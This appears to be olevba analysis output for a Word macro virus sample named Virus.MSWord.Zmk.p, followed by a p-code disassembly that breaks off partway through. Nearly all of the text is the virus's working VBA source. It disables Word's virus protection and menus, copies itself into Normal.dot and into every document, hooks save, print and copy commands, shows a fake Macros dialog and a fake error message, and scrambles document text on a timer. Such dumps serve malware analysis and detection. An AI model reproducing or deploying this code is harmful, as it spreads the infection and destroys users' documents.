olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ozwer.bas 
in file: Virus.MSWord.Zmk.p - OLE stream: 'Macros/VBA/ozwer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public Sub AutoExec()
On Error Resume Next
    With CommandBars("tools")
.Controls(13).Enabled = False 'macro
.Controls(14).Enabled = False 'plantillas y complementos....
.Controls(15).Enabled = False  'personalizar...
.Controls(16).Enabled = True  'opciones...
End With
CommandBars("view").Controls(6).Enabled = False 'barras de herramientas
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
End Sub
Sub AutoOpen()
On Error Resume Next
AutoExec
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    Options.VirusProtection = False
inf
timer
End Sub
Sub AutoClose()
c
End Sub
Sub inf()
On Error Resume Next
Options.SaveNormalPrompt = False
    If Nch = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ozwer", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="oswf", Object:=wdOrganizerObjectProjectItems
        Application.Caption = "° Microsoft Word"
    End If
    If Dch = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ozwer", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="oswf", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Function Nch()
Dim i As Integer
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "ozwer" Then Nch = True
    Next
End Function
Function Dch()
Dim j As Integer
    For j = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(j).Name = "ozwer" Then Dch = True
    Next
End Function
Public Sub c()
Options.SaveNormalPrompt = False
inf
End Sub
Sub FormatFont()
inf
Dialogs(wdDialogFormatFont).Show
End Sub
Sub FilePrint()
inf
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileSaveas()
c
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
c
ActiveDocument.Save
End Sub
Sub FileClose()
c
ActiveDocument.Close
End Sub
Sub filenew()
Word.Documents.Add
inf
timer
End Sub
Sub EditCopy()
inf
Selection.Copy
End Sub
Sub editpaste()
inf

Selection.Paste
End Sub
Sub Toolsmacro()
On Error Resume Next
oswf.Show
End Sub
Sub FileExit()
c
Application.Quit
MsgBox ("oK")
End Sub
Sub ViewVBCode()
On Error Resume Next
Dim letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
MsgBox "Error interno en Word Basic Err=1100e." + vbCr + "Imposible cargar bibliotecas dinámicas." + vbCr + vbCr + "Compruebe que todos los archivos estén" + vbCr + "en sus carpetas." + vbCr + vbCr + "Si el problema persiste, consulte la guia" + vbCr + "del usuario.", vbCritical
Case "&Options..."
MsgBox "Word Basic internal error Err=1100e." + vbCr + "Unable to load module 1x6004." + vbCr + vbCr + "Check that all files are in their folders" + vbCr + "and that they are not damaged." + vbCr + vbCr + "If the problem persists, consult user´s guide.", vbCritical
End Select
End Sub
Sub ToolsOptions()
Dim Y As Byte
Randomize
Y = Int((7 * Rnd) + 1)
Select Case Y
    Case 1
        Dialogs(wdDialogToolsOptionsTabView).Show
    Case 2
        Dialogs(wdDialogToolsOptionsSpellingAndGrammar).Show
    Case 3
        Dialogs(wdDialogToolsOptionsTabPrint).Show
    Case 4
        Dialogs(wdDialogToolsOptionsTabEdit).Show
    Case 6
         Dialogs(wdDialogToolsOptionsTabTrackChanges).Show
    Case 5
         Dialogs(wdDialogToolsOptionsTabUserInfo).Show
    Case 7
         Dialogs(wdDialogToolsOptionsCompatibility).Show
    End Select
End Sub
Sub osw2()Rem muy muy buena pero sin forma de desarmarlo !!!!!
Dim indi, nu, nu2, limite, x As Integer
x = Int((4 * Rnd) + 1)
On Error GoTo bye
limite = ActiveDocument.Words.Count
If limite = (limite > 350 And limite < 400) Or (limite > 700 And limite < 750) Or (limite > 900 And limite < 950) Or (limite > 1000 And limite < 1050) Or (limite > 1150 And limite < 1200) Or (limite > 1300 And limite < 1350) Or (limite > 1500 And limite < 1600) And x = 3 Then
    Selection.HomeKey Unit:=wdStory
    For indi = 1 To limite
        Randomize
        nu2 = Int((5 * Rnd) + 2)
        nu = Int((4 * Rnd) + 1)
        indi = indi + nu2
            ActiveDocument.Words(indi).Select
        WordBasic.MoveText
            If nu = 1 Then
                        Selection.MoveRight Unit:=wdWord, Count:=nu2
            Else
                        Selection.MoveLeft Unit:=wdWord, Count:=nu2
            End If
        WordBasic.OK
Next indi
End If
timer
bye:
End Sub
Sub timer()
Application.OnTime When:=Now + TimeValue("00:20:00"), Name:="osw2"
End Sub
-------------------------------------------------------------------------------
VBA MACRO oswf.frm 
in file: Virus.MSWord.Zmk.p - OLE stream: 'Macros/VBA/oswf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























Option Explicit
Private Sub CommandButton1_Click()
Beep
Beep
End Sub
Private Sub CommandButton2_Click()
On Error Resume Next
oswf.Hide
End Sub
Private Sub CommandButton3_Click()
Beep
Beep
End Sub
Private Sub CommandButton4_Click()
Beep
Beep
End Sub
Private Sub CommandButton5_Click()
Beep
Beep
End Sub
Private Sub CommandButton6_Click()
Beep
Beep
End Sub
Private Sub CommandButton7_Click()
Beep
Beep
End Sub
Private Sub userform_initialize()
On Error Resume Next
Dim user, docn, PyD, Pg, Cw, Dc, Mc, Pr, letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
        PyD = "Todas las Plantillas y documentos activos"
        Pg = "Normal.dot (plantilla global)"
        Cw = "Comandos de Word"
        Dc = " (documento)"
        Mc = "Macros creadas el "
        Pr = " por "
        CommandButton1.Caption = "Ejecutar"
        CommandButton1.ControlTipText = "Ejecuta una macro seleccionada (no hay macros disponibles)"
        CommandButton2.Caption = "Cancelar"
        CommandButton2.ControlTipText = "Cancelar selección"
        CommandButton3.Caption = "Paso a paso"
        CommandButton3.ControlTipText = "Ejecuta macro instrucción por instrucción"
        CommandButton4.Caption = "Modificar"
        CommandButton4.ControlTipText = "Modificar macro seleccionada (no hay macros disponibles)"
        CommandButton5.Caption = "Crear"
        CommandButton5.ControlTipText = "Crear una macro nueva (no disponible)"
        CommandButton7.Caption = "Eliminar"
        CommandButton7.ControlTipText = "Eliminar macro seleccionada (no hay macros disponibles)"
        CommandButton6.Caption = "Organizador..."
        Label3.Caption = "Nombre de la macro:"
        Label1.Caption = "Macros en:"
        Label2.Caption = "Descripción:"
        
        
Case "&Options..."
        PyD = "All templates and active documents"
        Pg = "Normal.dot (global template)"
        Cw = "Word commands"
        Dc = " (document)"
        Mc = "Macros made on "
        Pr = " by "
        CommandButton1.Caption = "Run"
        CommandButton1.ControlTipText = "Run selected macro (no macros available)"
        CommandButton2.Caption = "Cancel"
        CommandButton2.ControlTipText = "Cancel selection"
        CommandButton3.Caption = "Step by step"
        CommandButton3.ControlTipText = "Run macro step by step"
        CommandButton4.Caption = "Modify"
        CommandButton4.ControlTipText = "Modify selected macro seleccionada (no macros available)"
        CommandButton5.Caption = "New"
        CommandButton5.ControlTipText = "Create a new macro (not available)"
        CommandButton7.Caption = "Delete"
        CommandButton7.ControlTipText = "Delete selected macro (no macro selected)"
        CommandButton6.Caption = "Organizer..."
        Label3.Caption = "Macro name:"
        Label1.Caption = "Macros in:"
        Label2.Caption = "Description:"
End Select
docn = ActiveDocument.Name
user = Application.UserName
ComboBox1.Text = PyD
ComboBox1.AddItem (PyD), 0
ComboBox1.AddItem (Pg), 1
ComboBox1.AddItem (Cw), 2
ComboBox1.AddItem (docn & Dc), 3
ComboBox1.AddItem (""), 4
ComboBox1.AddItem (""), 5
TextBox1.Text = Mc & Date & Pr & user

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zmk.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/ozwer - 9522 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	FuncDefn (Public Sub AutoExec())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	StartWithExpr 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #4:
' 	LitVarSpecial (False)
' 	LitDI2 0x000D 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x0005 "macro"
' Line #5:
' 	LitVarSpecial (False)
' 	LitDI2 0x000E 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x001D "plantillas y complementos...."
' Line #6:
' 	LitVarSpecial (False)
' 	LitDI2 0x000F 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001F 0x000F "personalizar..."
' Line #7:
' 	LitVarSpecial (True)
' 	LitDI2 0x0010 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x000B "opciones..."
' Line #8:
' 	EndWith 
' Line #9:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x0030 0x0016 "barras de herramientas"
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Sub AutoOpen())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	ArgsCall AutoExec 0x0000 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #18:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	ArgsCall inf 0x0000 
' Line #21:
' 	ArgsCall timer 0x0000 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub AutoClose())
' Line #24:
' 	ArgsCall c 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub inf())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' 	Ld Nch 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "ozwer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "oswf"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	LitStr 0x0010 "° Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld Dch 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "ozwer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "oswf"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Function Nch())
' Line #40:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "ozwer"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Nch 
' 	EndIf 
' Line #43:
' 	StartForVariable 
' 	Next 
' Line #44:
' 	EndFunc 
' Line #45:
' 	FuncDefn (Function Dch())
' Line #46:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #47:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #48:
' 	Ld j 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "ozwer"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dch 
' 	EndIf 
' Line #49:
' 	StartForVariable 
' 	Next 
' Line #50:
' 	EndFunc 
' Line #51:
' 	FuncDefn (Public Sub c())
' Line #52:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #53:
' 	ArgsCall inf 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub FormatFont())
' Line #56:
' 	ArgsCall inf 0x0000 
' Line #57:
' 	Ld wdDialogFormatFont 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub FilePrint())
' Line #60:
' 	ArgsCall inf 0x0000 
' Line #61:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub FileSaveas())
' Line #64:
' 	ArgsCall c 0x0000 
' Line #65:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub FileSave())
' Line #68:
' 	ArgsCall c 0x0000 
' Line #69:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub FileClose())
' Line #72:
' 	ArgsCall c 0x0000 
' Line #73:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub filenew())
' Line #76:
' 	Ld Word 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' Line #77:
' 	ArgsCall inf 0x0000 
' Line #78:
' 	ArgsCall timer 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub EditCopy())
' Line #81:
' 	ArgsCall inf 0x0000 
' Line #82:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub editpaste())
' Line #85:
' 	ArgsCall inf 0x0000 
' Line #86:
' Line #87:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Sub Toolsmacro())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	Ld oswf 
' 	ArgsMemCall Show 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub FileExit())
' Line #94:
' 	ArgsCall c 0x0000 
' Line #95:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #96:
' 	LitStr 0x0002 "oK"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub ViewVBCode())
' Line #99:
' 	OnError (Resume Next) 
' Line #100:
' 	Dim 
' 	VarDefn letr (As String)
' Line #101:
' 	LitDI2 0x0010 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	St letr 
' Line #102:
' 	Ld letr 
' 	SelectCase 
' Line #103:
' 	LitStr 0x000C "Opcio&nes..."
' 	Case 
' 	CaseDone 
' Line #104:
' 	LitStr 0x0026 "Error interno en Word Basic Err=1100e."
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0027 "Imposible cargar bibliotecas dinámicas."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0026 "Compruebe que todos los archivos estén"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0010 "en sus carpetas."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Si el problema persiste, consulte la guia"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x000C "del usuario."
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #105:
' 	LitStr 0x000B "&Options..."
' 	Case 
' 	CaseDone 
' Line #106:
' 	LitStr 0x0024 "Word Basic internal error Err=1100e."
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x001D "Unable to load module 1x6004."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Check that all files are in their folders"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x001E "and that they are not damaged."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x002E "If the problem persists, consult user´s guide."
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #107:
' 	EndSelect 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub ToolsOptions())
' Line #110:
' 	Dim 
' 	VarDefn Y (As Byte)
' Line #111:
' 	ArgsCall Read 0x0000 
' Line #112:
' 	LitDI2 0x0007 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Y 
' Line #113:
' 	Ld Y 
' 	SelectCase 
' Line #114:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #115:
' 	Ld wdDialogToolsOptionsTabView 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #116:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #117:
' 	Ld wdDialogToolsOptionsSpellingAndGrammar 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #118:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #119:
' 	Ld wdDialogToolsOptionsTabPrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #120:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #121:
' 	Ld wdDialogToolsOptionsTabEdit 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #122:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #123:
' 	Ld wdDialogToolsOptionsTabTrackChanges 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #124:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #125:
' 	Ld wdDialogToolsOptionsTabUserInfo 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #126:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #127:
' 	Ld wdDialogToolsOptionsCompatibility 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #128:
' 	EndSelect 
' Line #129:
' 	EndSub 
' Line #130:
' 	FuncDefn (Sub osw2())
' 	Rem 0x0031 " muy muy buena pero sin forma de desarmarlo !!!!!"
' Line #131:
' 	Dim 
' 	VarDefn indi
' 	VarDefn nu
' 	VarDefn nu2
' 	VarDefn limite
' 	VarDefn x (As Integer)
' Line #132:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St x 
' Line #133:
' 	OnError bye 
' Line #134:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St limite 
' Line #135:
' 	Ld limite 
' 	Ld limite 
' 	LitDI2 0x015E 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0190 
' 	Lt 
' 	And 
' 	Paren 
' 	Eq 
' 	Ld limite 
' 	LitDI2 0x02BC 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x02EE 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x0384 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x03B6 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x03E8 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x041A 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x047E 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x04B0 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x0514 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0546 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x05DC 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0640 
' 	Lt 
' 	And 
' 	Paren 
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' Line #136:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #137:
' 	StartForVariable 
' 	Ld indi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld limite 
' 	For 
' Line #138:
' 	ArgsCall Read 0x0000 
' Line #139:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	St nu2 
' Line #140:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St nu 
' Line #141:
' 	Ld indi 
' 	Ld nu2 
' 	Add 
' 	St indi 
' Line #142:
' 	Ld indi 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #143:
' 	Ld WordBasic 
' 	ArgsMemCall MoveText 0x0000 
' Line #144:
' 	Ld nu 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #145:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	Ld nu2 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #146:
' 	ElseBlock 
' Line #147:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	Ld nu2 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0002 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	Ld WordBasic 
' 	ArgsMemCall OK 0x0000 
' Line #150:
' 	StartForVariable 
' 	Ld indi 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	ArgsCall timer 0x0000 
' Line #153:
' 	Label bye 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub timer())
' Line #156:
' 	Ld Now 
' 	LitStr 0x0008 "00:20:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0004 "osw2"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #157:
' 	EndSub 
' Macros/VBA/oswf - 6648 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' 	Option  (Explicit)
' Line #30:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #31:
' 	ArgsCall Beep 0x0000 
' Line #32:
' 	ArgsCall Beep 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	Ld oswf 
' 	ArgsMemCall Hide 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #39:
' 	ArgsCall Beep 0x0000 
' Line #40:
' 	ArgsCall Beep 0x0000 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Private Sub CommandButton4_Click())
' Line #43:
' 	ArgsCall Beep 0x0000 
' Line #44:
' 	ArgsCall Beep 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Private Sub CommandButton5_Click())
' Line #47:
' 	ArgsCall Beep 0x0000 
' Line #48:
' 	ArgsCall Beep 0x0000 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Private Sub CommandButton6_Click())
' Line #51:
' 	ArgsCall Beep 0x0000 
' Line #52:
' 	ArgsCall Beep 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Private Sub CommandButton7_Click())
' Line #55:
' 	ArgsCall Beep 0x0000 
' Line #56:
' 	ArgsCall Beep 0x0000 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Sub userform_initialize())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	Dim 
' 	VarDefn user
' 	VarDefn docn
' 	VarDefn PyD
' 	VarDefn Pg
' 	VarDefn Cw
' 	VarDefn Dc
' 	VarDefn Mc
' 	VarDefn Pr
' 	VarDefn letr (As String)
' Line #61:
' 	LitDI2 0x0010 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	St letr 
' Line #62:
' 	Ld letr 
' 	SelectCase 
' Line #63:
' 	LitStr 0x000C "Opcio&nes..."
' 	Case 
' 	CaseDone 
' Line #64:
' 	LitStr 0x0029 "Todas las Plantillas y documentos activos"
' 	St PyD 
' Line #65:
' 	LitStr 0x001D "Normal.dot (plantilla global)"
' 	St Pg 
' Line #66:
' 	LitStr 0x0010 "Comandos de Word"
' 	St Cw 
' Line #67:
' 	LitStr 0x000C " (documento)"
' 	St Dc 
' Line #68:
' 	LitStr 0x0012 "Macros creadas el "
' 	St Mc 
' Line #69:
' 	LitStr 0x0005 " por "
' 	St Pr 
' Line #70:
' 	LitStr 0x0008 "Ejecutar"
' 	Ld CommandButton1 
' 	MemSt Caption 
' Line #71:
' 	LitStr 0x003A "Ejecuta una macro seleccionada (no hay macros disponibles)"
' 	Ld CommandButton1 
' 	MemSt ControlTipText 
' Line #72:
' 	LitStr 0x0008 "Cancelar"
' 	Ld CommandButton2 
' 	MemSt Caption 
' Line #73:
' 	LitStr 0x0012 "Cancelar selección"
' 	Ld CommandButton2 
' 	MemSt ControlTipText 
' Line #74:
' 	LitStr 0x000B "Paso a paso"
' 	Ld CommandButton3 
' 	MemSt Caption 
' Line #75:
' 	LitStr 0x0029 "Ejecuta macro instrucción por instrucción"
' 	Ld CommandButton3 
' 	MemSt ControlTipText 
' Line #76:
' 	LitStr 0x0009 "Modificar"
' 	Ld CommandButton4 
' 	MemSt Caption 
' Line #77:
' 	LitStr 0x0038 "Modificar macro seleccionada (no hay macros disponibles)"
' 	Ld CommandButton4 
' 	MemSt ControlTipText 
